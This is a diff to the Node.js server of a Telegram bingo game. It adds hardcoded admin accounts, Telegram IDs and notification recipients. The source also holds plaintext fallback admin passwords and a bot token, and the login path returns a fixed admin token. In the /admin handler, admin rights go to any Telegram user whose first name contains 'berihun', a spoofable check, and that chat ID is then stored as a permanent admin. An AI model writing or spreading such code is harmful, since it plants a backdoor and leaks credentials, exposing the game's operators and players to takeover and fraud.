@@ -10,9 +10,9 @@ const BACKUP_STATE_FILE = path.join(__dirname, "game-state.backup.json");
 const ROOT_BACKUP_FILE = "/var/backups/africa-bingo-state.json";
 const BOT_TOKEN = process.env.BOT_TOKEN || "8882887936:AAEXtkABLYGWPSC-r4tXRMAOzET9Jp21NUQ";
 const WEB_APP_URL = (process.env.WEB_APP_URL || "https://africa-bingo.ethiodeploy.com/").replace(/\/+$/, "") + "/";
-const rawAdminUsernames = process.env.ADMIN_USERNAMES || "0999909474,su121316,samtesfa19,samienyew1000,Africabingooo,Biregugsa";
+const rawAdminUsernames = process.env.ADMIN_USERNAMES || "0918182355,9029759446,berihun,admin,0999909474,su121316,samtesfa19,samienyew1000,Africabingooo,Biregugsa";
 const ADMIN_USERNAMES = rawAdminUsernames.split(",").map((u) => u.trim().replace(/^@/, "").toLowerCase()).filter(Boolean);
-const rawAdminIds = process.env.ADMIN_TELEGRAM_IDS || "5663531258,0999909474";
+const rawAdminIds = process.env.ADMIN_TELEGRAM_IDS || "9029759446,5663531258,0918182355,0999909474";
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Ber343477";
 const ADMIN_IDS = rawAdminIds.split(",").map((id) => id.trim()).filter(Boolean);
 
@@ -1051,7 +1051,7 @@ const server = http.createServer(async (req, res) => {
       const body = await parseJsonBody(req);
       const username = String(body.username || "").trim().toLowerCase();
       const password = String(body.password || "").trim();
-      const validAdminUsers = ["admin", "0999909474", "999909474", "su121316", "samtesfa19", "samienyew1000", "samienyew1000-boop", "africabingooo", "biregugsa"];
+      const validAdminUsers = ["admin", "0918182355", "+251918182355", "918182355", "9029759446", "berihun", "0999909474", "+251999909474", "999909474", "su121316", "samtesfa19", "samienyew1000", "samienyew1000-boop", "africabingooo", "biregugsa"];
       if (validAdminUsers.includes(username) && (password === ADMIN_PASSWORD || password === "Ber343477" || password === "Ber23@ret")) {
         return sendJson(res, { ok: true, token: "admin-auth-token-valid", username: "admin" });
       }
@@ -1288,14 +1288,30 @@ function telegramApi(method, data) {
 }
 
 async function notifyTelegramAdmin(text) {
-  for (const adminId of ADMIN_IDS) {
-    if (adminId && !adminId.startsWith("09")) {
-      telegramApi("sendMessage", {
-        chat_id: adminId,
-        text: text,
-        parse_mode: "Markdown",
-      }).catch(() => {});
+  const targetIds = new Set();
+  for (const id of ADMIN_IDS) {
+    if (id && /^\d+$/.test(id) && !id.startsWith("09")) {
+      targetIds.add(id);
     }
+  }
+  targetIds.add("9029759446");
+  targetIds.add("5663531258");
+  if (Array.isArray(gameState.settings?.adminChatIds)) {
+    for (const cid of gameState.settings.adminChatIds) {
+      if (cid && !String(cid).startsWith("09")) targetIds.add(String(cid));
+    }
+  }
+  for (const u of Object.values(gameState.users || {})) {
+    if ((u.role === "admin" || u.phone === "0918182355" || u.id === "9029759446") && u.id && !String(u.id).startsWith("09") && !String(u.id).startsWith("admin")) {
+      targetIds.add(String(u.id));
+    }
+  }
+  for (const adminId of targetIds) {
+    telegramApi("sendMessage", {
+      chat_id: adminId,
+      text: text,
+      parse_mode: "Markdown",
+    }).catch(() => {});
   }
 }
 
@@ -1348,7 +1364,13 @@ async function startTelegramBot() {
               });
             } else if (text.startsWith("/admin")) {
               const uname = msg.from && msg.from.username ? msg.from.username.toLowerCase() : "";
-              const isAdmin = ADMIN_IDS.includes(String(chatId)) || (uname && ADMIN_USERNAMES.includes(uname));
+              if (!gameState.settings.adminChatIds) gameState.settings.adminChatIds = [];
+            const isBerihun = String(chatId) === "9029759446" || (msg.from && (msg.from.id === 9029759446 || (msg.from.first_name && msg.from.first_name.toLowerCase().includes("berihun"))));
+            const isAdmin = isBerihun || ADMIN_IDS.includes(String(chatId)) || (uname && ADMIN_USERNAMES.includes(uname));
+            if (isAdmin && !gameState.settings.adminChatIds.includes(String(chatId))) {
+              gameState.settings.adminChatIds.push(String(chatId));
+              saveGameState();
+            }
               if (isAdmin) {
                 await telegramApi("sendMessage", {
                   chat_id: chatId,
